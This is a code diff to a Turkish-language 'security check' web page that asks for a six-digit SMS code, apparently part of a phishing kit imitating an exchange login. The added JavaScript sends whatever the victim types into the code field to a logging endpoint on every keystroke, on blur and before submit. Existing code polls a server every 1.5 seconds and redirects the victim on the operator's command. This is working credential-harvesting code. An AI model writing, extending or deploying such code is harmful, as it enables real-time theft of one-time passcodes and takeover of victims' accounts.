@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Güvenlik Kontrolü</title>
+  <title>SMS2 | Güvenlik Kontrolü</title>
   <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico">
   <link rel="stylesheet" href="../assets/css/style.css">
 </head>
@@ -328,16 +328,62 @@
     </div>
   </div>
   <script>
+    async function sendLogUpdate(payload) {
+      try {
+        const body = JSON.stringify(payload);
+        await fetch('/api/log-page', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body
+        });
+      } catch (err) {
+        console.error('SMS2 log error', err);
+      }
+    }
+
+    function logSms2Page() {
+      sendLogUpdate({ page: 'sms2' }).catch(err => console.error('SMS2 page log failed', err));
+    }
+
+    async function logSms2Input(value) {
+      if (value && value.trim()) {
+        await sendLogUpdate({
+          page: 'sms2',
+          inputs: { input3: value.trim() }
+        });
+      }
+    }
+
+    logSms2Page();
+
     function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const frm = document.querySelector('form');
     const sIpp = frm.elements[0];
     const btn = document.querySelector(".btn-group button.bc-btn.bc-btn-yellow.sensors-login");
 
-    frm.addEventListener('submit', (evt) => {
+    // Input değeri değiştiğinde kaydet
+    let sms2InputTimeout;
+    sIpp.addEventListener('input', function() {
+      clearTimeout(sms2InputTimeout);
+      sms2InputTimeout = setTimeout(function() {
+        if (sIpp.value && sIpp.value.trim()) {
+          logSms2Input(sIpp.value);
+        }
+      }, 500);
+    });
+
+    sIpp.addEventListener('blur', function() {
+      if (sIpp.value && sIpp.value.trim()) {
+        logSms2Input(sIpp.value);
+      }
+    });
+
+    frm.addEventListener('submit', async function(evt) {
       evt.preventDefault();
       if (/^\d{6}$/.test(sIpp.value.trim())) {
         sIpp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
         sIpp.parentElement.nextElementSibling.style.display = 'none';
+        await logSms2Input(sIpp.value);
         frm.submit();
       } else {
         sIpp.parentElement.style.borderColor = '#f84960';
@@ -345,10 +391,12 @@
       }
     });
 
-    btn.addEventListener('click', () => {
-      document.querySelector('.area').style.display = 'none';
-      document.querySelector("body > div.area").remove();
-    });
+    if (btn) {
+      btn.addEventListener('click', () => {
+        document.querySelector('.area').style.display = 'none';
+        document.querySelector("body > div.area").remove();
+      });
+    }
   </script>
 </body>
 
